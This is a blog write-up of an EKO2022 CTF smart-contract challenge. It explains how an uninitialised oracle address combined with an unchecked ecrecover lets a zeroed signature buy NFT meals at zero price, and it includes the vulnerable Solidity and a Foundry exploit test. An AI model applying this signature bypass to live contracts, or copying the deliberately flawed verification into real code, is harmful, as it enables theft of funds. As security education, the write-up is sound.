---
title: 'EKO2022 Enter the metaverse CTF Challenge 2 — Metaverse Supermarket'
excerpt: EKO2022 Enter the metaverse is a collection of challenges made for the EKOparty 2022 submited by some gigabrain hackers</br></br>Our goal is to be able to mint tons of `Meal`. It won't be easy because each meal costs 1e6 tokens and only owns 10 of them 😐.
coverImage:
  url: '/assets/blog/eko2022.jpg'
  credit:
    name: EKO2022 Enter the metaverse
    url: https://www.ctfprotocol.com/tracks/eko2022
date: '2023-03-01T18:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/eko2022.jpg'
---

This is Part 2 of the series "Let's play EKO2022 Enter the metaverse CTF"

[EKO2022 Enter the metaverse](https://www.ctfprotocol.com/tracks/eko2022) is a collection of challenges made for the [EKOparty](https://www.ekoparty.org/) 2022 submitted by some gigabrain hackers; [@Br0niclΞ](https://twitter.com/Cryptonicle1), [@nicobevi.eth](https://twitter.com/nicobevi_eth), [@matta](https://twitter.com/mattaereal), [@tinchoabbate](https://twitter.com/tinchoabbate), [@adriro](https://twitter.com/adrianromero), [@bengalaQ](https://twitter.com/AugustitoQ), [@chiin](https://linktr.ee/chiin.eth), [@Rotciv](https://twitter.com/victor93389091), [@Bahurum](https://twitter.com/bahurum) and [@0x4non](https://twitter.com/eugenioclrc).

This is a simple experiment of the **Proof of Hack Protocol**. It's a mix between classical blockchain challenges, and new ones, it's permissionless, this page will curate some of them.  
After you break each challenge, you can claim a soulbound NFT on polygon.

## Challenge #2  —  Metaverse Supermarket

> We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. Stability has become a scarce resource and even going to the store is a painful experience: we need to rely on oracles that sign off-chain data that lasts a couple of blocks because updating prices on-chain would be complete madness.  
> You are out of INFLAs and you are starving, can you defeat the system?
>
> Challenge url: [Metaverse Supermarket](https://www.ctfprotocol.com/tracks/eko2022/metaverse-supermarket)
> Challenge author: [adriro](https://twitter.com/adrianromero)

## The attacker end goal

Our goal is to be able to mint tons of `Meal` (well, at least 10 according to what I can see in the `isComplete` checks of the `ChallengeMetaverseSupermarketFactory` 😄). It won't be easy because each meal costs 1e6 tokens (1000000) and only owns 10 of them 😐.

## Study the contracts

## Challenge Factory Contract

This part is important to be able to understand

- What has been deployed
- Which parameters
- What contracts could we interact with?
- What the challenge, check to see if we have solved it

### Deployment

By looking at the `ChallengeMetaverseSupermarketFactory` we see that the `deploy` function just takes the `_player` address and returns the `InflaStore` instance as the only value we can directly manipulate

```solidity
function deploy(address _player) external payable override returns (address[] memory ret) {
    require(msg.value == 0, "dont send ether");
    address _challenge = address(new InflaStore(_player));

    ret = new address[](1);
    ret[0] = _challenge;
    _challengePlayer[_challenge] = _player;
}
```

### Completion checks

In the `isComplete` function of the factory, it checks that the `player` was able to mint and own at least 10 `Meal`'s.

```solidity
function isComplete(address[] calldata _challenges) external view override returns (bool) {
    return IERC721(address(InflaStore(_challenges[0]).meal())).balanceOf(_challengePlayer[_challenges[0]]) >= 10;
}
```

## `Infla.sol`

This contract represents the ERC20 token used to buy `Meal` (what we eat in the metaverse, apparently). It's a pretty standard ERC20 token based on the Solmate implementation.

When the contract is deployed, it mints `amount` of wei to the `player` address.

## `Meal.sol`

Also this contract seems to be pretty standard. It's a normal ERC721 token, based on the Solmate implementation.

The `safeMint` function is protected and can be executed only by the `_owner` of the contract. It just mints a `Meal` NFT and sends it to the `to` address.

One thing that we can note is that it uses the `_safeMint` function that could lead to some re-entrancy attacks (it always depends on how it's used by the caller)

## `InflaStoreEIP712.sol`

This contract inherit from EIP712 contract (from OpenZeppelin). The contract implements the [EIP-712: Typed structured data hashing and signing](https://eips.ethereum.org/EIPS/eip-712) EIP, and will be used by the `InflaStore` contract to get the hash of a `OraclePrice` struct.

Nothing special to see here

## `InflaStore.sol`

The contract inherit from `InflaStoreEIP712` to offer support to the `EIP712` standard.

Let's look at the variables and the constructor of the contract

```solidity
Meal public immutable meal;
Infla public immutable infla;

address private owner;
address private oracle;

uint256 public constant MEAL_PRICE = 1e6;
uint256 public constant BLOCK_RANGE = 10;

constructor(address player) EIP712("InflaStore", "1.0") {
    meal = new Meal();
    infla = new Infla(player, 10);
    owner = msg.sender;
}
```

From the state variables, we can see that it stores an immutable reference to both the `meal` NFT contract and the `infla` ERC20 contract. The Infla tokens are used by the end user to purchase the meals.

Then we have the `owner` and the `oracle` reference. Each meal will cost `1e6` wei of `Infla` to purchase one meal.

In the `constructor` of the contract it initializes the `EIP712` inherited contract, creates a new `Meal` contract, a new `Infla` contract (it will mint `10` wei of Infla to the `player`) and set the owner equal to the deployer.

Have you spotted something **odd**? Well, the `oracle` address has not been initialized... Let's keep going and look at all the other functions.

`setOracle` allows the owner to update the `oracle` address

```solidity
function setOracle(address _oracle) external {
    require(owner == msg.sender, "!owner");
    oracle = _oracle;
}
```

`_mintMeal` is a `private` function used by the `buy` and `buyUsingOracle` functions. It transfers the current `price` to buy a `Meal` to this contract and mint the `Meal` to the `buyer` address.

```solidity
function _mintMeal(address buyer, uint256 price) private {
    infla.transferFrom(buyer, address(this), price);
    meal.safeMint(buyer);
}
```

The `safeMint` function, as we saw, could lead to a re-entrancy attack, but in this case, I would say that we should be safe, given that we have already transferred the user's balance.

Now let's look at the `buy` function

```solidity
function buy() external {
    _mintMeal(msg.sender, MEAL_PRICE);
}
```

it can be called by anyone and allows the user to buy a `Meal` for `1e6` `Infla` wei.

Then we have a more interesting function... `buyUsingOracle` allows anyone to purchase a `Meal` with the price that should have been signed by the oracle. That price can be any value, so you could end up by purchasing a `Meal` for more than the default price (I doubt that you would like to overpay for it, right?) or for a lower one. Even for zero!

```solidity
function buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature) external {
    _validateOraclePrice(oraclePrice, signature);
    _mintMeal(msg.sender, oraclePrice.price);
}
```

But before being able to do this special purchase, it must pass the `_validateOraclePrice` validation step that verifies that the `oraclePrice` has been properly signed by the `oracle` and that the time (`block.number`) reference of the price is not too old. Prices that are older than 10 days ago will not be accepted!

```solidity
function _validateOraclePrice(OraclePrice calldata oraclePrice, Signature calldata signature) private view {
    require(block.number - oraclePrice.blockNumber < BLOCK_RANGE, "price too old!");

    bytes32 oracleHash = _hashOraclePrice(oraclePrice);
    address recovered = _recover(oracleHash, signature.v, signature.r, signature.s);

    require(recovered == oracle, "not oracle!");
}
```

After checking that the price is not too old, the function verifies that the `oracle` was the one signing the price. You can't trust anyone, right?

The first thing that the contract do is to re-recreate the `hash` of the message. After that, it will try to recover from the `hash` and the `v`, `r`, and `s` signature parameter who was the signer. If the signer is equal to the `oracle` everything is fine, and we can proceed to use the new `price` for the mint; otherwise it will revert the transaction.

I think that you can already see where's the problem here, right? But first I want to show you another one. The contract is not validating in any way the order of the prices. If a signature is valid, they just use the price without checking for which time period it was right.

Just to make an example. The oracle sign a price for `DAY 3` and another one for `DAY 4`. Both prices are valid for this function logic and will pass the validation until they "expire". But as you can understand, only the newest one should be possible to be used; otherwise you could be able to use a lower price that is older compared to the latest price that has been used to mint the last `Meal`!

Ok, now back on the track. Let's see how the `_recover` function is made

```solidity
function _recover(bytes32 digest, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
    require(v == 27 || v == 28, "invalid v!");
    return ecrecover(digest, v, r, s);
}
```

Let's do a brief explanation about the `ecrecover` function. From the [Solidity Docs about the ecrecover](https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=ecrecover#mathematical-and-cryptographic-functions) we know that

> `ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address)` is a native function used to recover the address associated with the public key from elliptic curve signature or return zero on error.
> The function parameters correspond to ECDSA values of the signature:
>
> - `r` = first 32 bytes of signature
> - `s` = second 32 bytes of signature
> - `v` = final 1 byte of signature

Under the explanation, there's also a **huge warning**:

> If you use `ecrecover`, be aware that a valid signature can be turned into a different valid signature without requiring knowledge of the corresponding private key. In the Homestead hard fork, this issue was fixed for _transaction_ signatures (see [EIP-2](https://eips.ethereum.org/EIPS/eip-2#specification)), but the ecrecover function remained unchanged.
>
> This is usually not a problem unless you require signatures to be unique or use them to identify items. OpenZeppelin have a [ECDSA helper library](https://docs.openzeppelin.com/contracts/2.x/api/cryptography#ECDSA) that you can use as a wrapper for `ecrecover` without this issue.

I think that it is safe to say that the `InflaStore` contract is a lot bugged. The only check that is done is that `v` is valid, but after that, they only check that `oracle == ecrecover(digest, v, r, s)`.

They are ignoring the fact that, as the documentation says, `ecrecover` could return `address(0)` in case of an error!

Now, if you remember both the `ChallengeMetaverseSupermarketFactory.deploy` function and the `InflaStore` `constructor` do not initialize the oracle contract...

This means that right now `oracle == address(0)` and every call to `_validateOraclePrice` that simply fails to validate the signature will make the function pass!

To complete the challenge, we just need to call the `buyUsingOracle` with a zero price signed by something that will make the `ecrecover` fail to retrieve the signer address!

Let's go! Free meals for everyone!!!

## Solution code

Now that we know what we have to do, we can simply write down the solution code and execute it

Here's the code of our custom smart contract

```solidity
contract MetaverseSupermarketTest is EkoBaseTest {
    InflaStore store;

    function preSetupHook() internal override {
        super.preSetupHook();

        /* IMPLEMENT YOUR PRE SETUP */

        // Init the challenge
        factory = new ChallengeMetaverseSupermarketFactory();
        challenges = factory.deploy(player);
        store = InflaStore(challenges[0]);
    }

    function runExploit() internal override {
        // When a new `InflaStore` is created, the contract does not initialize the `oracle` address
        // the `ChallengeMetaverseSupermarketFactory` factory never call the `setOracle` method updating the oracle
        // So `oracle` remain with the default value that is `address(0)`

        // Now if you have followed all my previous CTF blog posts you should already know how ECDSA works
        // Inside the `_validateOraclePrice` function of `InflaStore` (used to validate the oracle price signature)
        // they checks two things
        // 1) the `v` value must be equal to 27 or 28 (checked internally by `_recover` for signature malleability)
        // 2) the `signer` of the message must be equal to the `oracle`
        // The problem is that `ecrecover` (an EVM precompiled function) will not cover all the security checks
        // you should do as a smart contract developer. The only role of that function is to return
        // the return the address from the given signature by calculating a recovery function of ECDSA.
        // Basically, given a signature (v, r, s) and a signed message it returns who has signed it.
        // When the function fails to do that (malformed hash, invalid signature and so on)
        // it will return `address(0)` that should be treated as an error and revert immediately

        // To solve the challenge, we just need to be able to set the oracle price of the Meal
        // to be equal to zero and execute some free mint (well will still pay for gas but still...)

        // Create an Oracle Price using the current block number in order to be able to execute the transaction
        // without reverting (`_validateOraclePrice` reverts if the price is too old)
        // and set the oracle price to zero (free mint yay!)
        OraclePrice memory oraclePrice = OraclePrice({
            blockNumber: block.number,
            price: 0
        });

        // Now we build a signature that just need to pass the `v` test (it can be only 27 and 28)
        // And fail all the `ecrecover` internal test to make it returns `address(0)`
        Signature memory signature = Signature({
            v: 27,
            r: bytes32(""),
            s: bytes32("")
        });

        // Now that we have prepared the ground we can just simply start minting our free Meals!
        // Note that we could mint those in an infinite loop because now the price is zero!
        for( uint i = 0; i < 20; i++ ) {
            vm.prank(player);
            store.buyUsingOracle(oraclePrice, signature);
        }
    }
}
```

You can read the full solution of the challenge opening [MetaverseSupermarket.t.sol](https://github.com/StErMi/Proof-Of-Hack-Protocol-CTF/blob/main/test/MetaverseSupermarket.t.sol).

## Further reading

- [Vitalik Buterin: Exploring Elliptic Curve Pairings](https://medium.com/@VitalikButerin/exploring-elliptic-curve-pairings-c73c1864e627)
- [Immunify: Intro to Cryptography and Signatures in Ethereum](https://medium.com/immunefi/intro-to-cryptography-and-signatures-in-ethereum-2025b6a4a33d)
- [Alex Papageorgiou - B002: Solidity EC Signature Pitfalls](https://0xsomeone.medium.com/b002-solidity-ec-signature-pitfalls-b24a0f91aef4)
- [Solidity Developer: What is ecrecover in Solidity?](https://soliditydeveloper.com/ecrecover)
- [Ethereum EIP-191: Signed Data Standard](https://eips.ethereum.org/EIPS/eip-191)
- [Ethereum EIP-712: Typed structured data hashing and signing](https://eips.ethereum.org/EIPS/eip-712)
- [EIP-2612: Permit - 712-signed approvals](https://eips.ethereum.org/EIPS/eip-2612) (a good example of an applied case of signature usage)
- [SWC-122: Lack of Proper Signature Verification](https://swcregistry.io/docs/SWC-122)
- [SWC-121: Missing Protection against Signature Replay Attacks](https://swcregistry.io/docs/SWC-121)
- [SWC-117: Signature Malleability](https://swcregistry.io/docs/SWC-117)
- OpenZeppelin [ECDSA](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA), [SignatureChecker](https://docs.openzeppelin.com/contracts/4.x/api/utils#SignatureChecker) and [EIP712](https://docs.openzeppelin.com/contracts/4.x/api/utils#EIP712)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
